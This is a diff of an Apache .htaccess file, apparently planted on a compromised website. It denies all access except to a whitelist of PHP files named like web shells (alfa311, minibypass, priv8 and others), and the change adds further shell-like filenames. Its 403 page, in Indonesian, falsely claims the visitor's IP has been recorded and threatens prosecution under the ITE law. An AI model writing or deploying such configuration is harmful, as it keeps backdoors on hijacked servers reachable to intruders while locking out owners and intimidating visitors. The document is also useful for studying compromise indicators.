@@ -4,8 +4,8 @@ Deny from all
     Order allow,deny
     Allow from all
 </FilesMatch>
-<FilesMatch '^(|db123_1.php|lock_lock21.php|minibypass_1.PHP|index.html|alfa311_1.php|priv8_12.php|css_13.php|.minibypass_1.PHP|.minibypass_1.php|sitemap.xml|)$'>
+<FilesMatch '^(|lock_lock21.php|minibypass_1.php|alfa311_1.php|priv8_12.php|css_13.php|db_354@.php|.minibypass_1.php|index.html|sitemap.xml|kuat354.PHP|kuat354.php|moli.php|minibypass_1.PHP|)$'>
     Order allow,deny
     Allow from all
 </FilesMatch>
-ErrorDocument 403 '<center><img src="https://i.ibb.co/HqHdZPR/skskks.png"></img> <h3>Sistem Sudah Mencatat Alamat IP Kamu dan Kami akan menindaklanjuti Tindakan illegal yang Anda lakukan.</h3><font>"Kami mendeteksi adanya tindak kejahatan yang Anda lakukan, Tindakan ini telah diatur oleh Pasal 30 ayat 1, ayat 2, dan atau ayat 3 UU No 11/2008 tentang Informasi dan Transaksi Elektronik (ITE) dengan hukuman 15 tahun penjara."</font><font color=black><br> Kami telah mencatat VPN IP ADRESS ANDA</font><font color=black> <br> User-Agent : <font color=red>%{HTTP_USER_AGENT}</font>'
+ErrorDocument 403 '<center><img src="https://i.ibb.co/dJPK7WQ/Siber.png"></img> <h3>Sistem Sudah Mencatat Alamat IP Kamu dan Kami akan menindaklanjuti Tindakan illegal yang Anda lakukan.</h3><font>"Kami mendeteksi adanya tindak kejahatan yang Anda lakukan, Tindakan ini telah diatur oleh Pasal 30 ayat 1, ayat 2, dan atau ayat 3 UU No 11/2008 tentang Informasi dan Transaksi Elektronik (ITE) dengan hukuman 15 tahun penjara."</font><font color=black><br> Kami telah mencatat VPN IP ADRESS ANDA</font><font color=black> <br> User-Agent : <font color=red>%{HTTP_USER_AGENT}</font>'
